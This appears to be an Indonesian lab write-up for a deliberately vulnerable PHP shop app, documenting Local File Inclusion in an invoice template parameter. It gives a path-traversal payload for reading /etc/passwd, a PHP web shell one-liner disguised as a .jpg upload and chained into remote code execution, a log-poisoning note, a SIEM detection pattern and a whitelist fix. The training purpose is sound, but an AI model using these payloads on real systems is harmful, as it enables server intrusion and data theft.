# LFI — Local File Inclusion

## Deskripsi
LFI terjadi ketika aplikasi menggunakan input user untuk menentukan file yang di-include/load, tanpa validasi path yang memadai. Attacker bisa membaca file sistem sensitif, atau dalam kombinasi dengan File Upload, mencapai Remote Code Execution (RCE).

**Severity:** High (Critical jika dichain dengan File Upload)  
**OWASP:** A03:2021 — Injection

## Endpoint Vulnerable
- `GET /public/invoice.php?id=1&template=<PAYLOAD>`
- Parameter `template` digunakan untuk include file tanpa sanitasi

## Langkah Eksploitasi

### Basic LFI — Baca /etc/passwd
```
GET /public/invoice.php?id=1&template=../../../etc/passwd
```
> Catatan: template di-append ke path `templates/invoice_` + `.php`  
> Untuk LFI penuh, uncomment baris `include($template)` di source code

### LFI → RCE Chain
1. **Upload PHP shell** via `/public/sell.php` (Unrestricted Upload)
   - Upload file `shell.php` dengan ekstensi `.jpg` (bypass extension check)
   - File tersimpan di `/uploads/products/prod_xxx.jpg`

2. **Include via LFI**
   ```
   GET /invoice.php?id=1&template=../uploads/products/prod_xxx
   ```
   - Apache menjalankan PHP di dalam file `.jpg` tersebut
   - Result: Remote Code Execution

3. **Shell payload:**
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   Akses: `/invoice.php?id=1&template=../uploads/products/prod_xxx&cmd=id`

## Expected Output
- Isi file `/etc/passwd` tampil di halaman
- Atau: output perintah shell dieksekusi di server

## SIEM Alert
Rule: `LFI` (Phase 2)  
Pattern: `../` atau `/etc/` di parameter GET/POST

## Cara Fix (Secure Mode)
```php
// Whitelist template yang diizinkan
$allowed = ['default', 'compact', 'detailed'];
$template = $_GET['template'] ?? 'default';
if (!in_array($template, $allowed)) {
    $template = 'default';
}
// Gunakan basename() untuk mencegah path traversal
$template = basename($template);
$path = __DIR__ . '/../../templates/invoice_' . $template . '.php';
```

## Attack Chain
- **LFI + File Upload = RCE**: Upload shell → include via LFI → jalankan perintah
- **LFI + Log Poisoning**: Inject PHP ke Apache access log → include via LFI
